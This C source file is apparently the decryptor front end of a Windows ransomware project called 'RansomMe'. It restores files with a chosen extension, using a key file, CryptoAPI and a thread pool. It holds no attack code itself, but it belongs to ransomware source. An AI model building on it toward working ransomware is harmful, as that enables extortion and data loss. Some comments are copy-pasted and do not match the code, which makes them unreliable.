#define _CRT_SECURE_NO_WARNINGS

#include "..\RansomMe\RansomMe.h"

int main(int argc, char* argv[]) {
    const char* defaultCryptoFileExt = ".enc";
    const char* defaultKeyFileName = "\\key.bin";

    char targetDir[MAX_PATH];
    char cryptoFileExt[MAX_EXT];
    char keyFile[MAX_PATH];

    // Check for input parameters
    if (argc > 1) {
        // targetDir must not be longer than MAX_PATH (Windows constant)
        if (strlen(argv[1]) > MAX_PATH) {
            printf("Error: targetDir is longer than MAX_PATH (%d)", MAX_PATH);
            return 1;
        }
        else {
            // Copy the target dir to targetDir
            strcpy_s(targetDir, MAX_PATH, argv[1]);
        }

        if (argc > 2) {
            // The extension must not be longer than MAX_EXT
            if (strlen(argv[2]) > MAX_EXT) {
                printf("Error: cryptoExtension cannot be longer than %d", MAX_EXT);
                return 1;
            }
            // Check if the '.' was prepended in the command line and add it, if not
            if (argv[2][0] != '.') {
                // Append the dot
                sprintf_s(cryptoFileExt, MAX_EXT, ".%s", argv[2]);
            }
            else {
                // Copy the target dir to targetDir
                strcpy_s(cryptoFileExt, MAX_EXT, argv[2]);
            }

            if (argc > 3) {
                // The server name must not be longer than INTERNET_MAX_HOST_NAME_LENGTH
                if (strlen(argv[3]) > MAX_PATH) {
                    printf("Error: keyFile cannot be longer than %d", MAX_PATH);
                    return 1;
                }
                else {
                    // Copy the target dir to targetDir
                    strcpy_s(keyFile, MAX_PATH, argv[3]);
                }
            }
            else {
                // Copy the default values
                // Get the current directory to import the key from there
                if (!GetCurrentDirectoryA(MAX_PATH, keyFile)) {
                    printf("Error getting the current directory. Error code: %lu\n", GetLastError());
                    return;
                }
                // Append the default key file name
                my_strcat_s(keyFile, MAX_PATH, defaultKeyFileName);
            }
        }
        else {
            // Copy the default values
            strcpy_s(cryptoFileExt, MAX_EXT, defaultCryptoFileExt);
            // Get the current directory to import the key from there
            if (!GetCurrentDirectoryA(MAX_PATH, keyFile)) {
                printf("Error getting the current directory. Error code: %lu\n", GetLastError());
                return;
            }
            // Append the default key file name
            my_strcat_s(keyFile, MAX_PATH, defaultKeyFileName);
        }
    }
    else {
        printf("Usage: .%s <targetDir> [cryptoExtension (default=.enc)] [keyFile (default=.\key.bin)]\n", strrchr(argv[0], '\\'));
        return 1;
    }

    //------------- LOCAL VARIABLES -------------------------------------------------
        // general purpose variables
    size_t totalFileNumber = 0;                     // number of files found
    size_t decryptedFileNumber = 0;                 // number of decrypted files
    ULARGE_INTEGER start, end;                      // start time and end time to measure performance

    // thread pool variables
    TP_CALLBACK_ENVIRON poolEnv;                    // a pool environment struct to handle the thread pool
    PTP_CLEANUP_GROUP cleanupgroup = NULL;          // a cleanup group handle to safely close all the threads in the pool

    // encryption variables
    HCRYPTPROV hCryptProv = 0;                      // handler for the crypto provider
    HCRYPTKEY hKey = 0;                             // handler for the encryption key

    //------------- INIT AND EXECUTE --------------------------------------------------
    // Initialize the thread pool. This will create a thread pool and a cleanup group
    //   and will link them to the same pool environment handler
    if (!InitThreadPool(&poolEnv, &cleanupgroup)) {
        printf("Could not initialize the thread pool. Error code: %lu\n", GetLastError());
        return 0;
    }

    // Initialize the crypto environment. This will acquire a context and generate a key
    if (!InitDeCrypto(&hCryptProv, &hKey, keyFile)) {
        printf("Could not initialize the crypto environment. Error code: %lu\n", GetLastError());
        return 0;
    }

    // start the timer
    GetTime(&start);

    totalFileNumber = startDecryptionWithThreads(targetDir, cryptoFileExt, &decryptedFileNumber, hKey, &poolEnv, cleanupgroup);

    // end the time    
    GetTime(&end);

    printf("%zd files found.\n", totalFileNumber);
    printf("%zd files decrypted.\n", decryptedFileNumber);

    // Calculate the elapsed time in seconds
    ULONGLONG elapsedMilliseconds = (end.QuadPart - start.QuadPart) / 10000000;
    printf("Elapsed Time: %llu seconds\n", elapsedMilliseconds);

    //------------- CLEAN UP --------------------------------------------------------
        // Release the encryption key
    if (hKey) {
        if (!(CryptDestroyKey(hKey))) {
            printf("Error during CryptDestroyKey!. Error code: %lu\n", GetLastError());
        }
    }
    // Release the crypto provider handle.
    if (hCryptProv) {
        if (!(CryptReleaseContext(hCryptProv, 0))) {
            printf("Error during CryptReleaseContext!. Error code: %lu\n", GetLastError());
        }
    }

    return 0;
}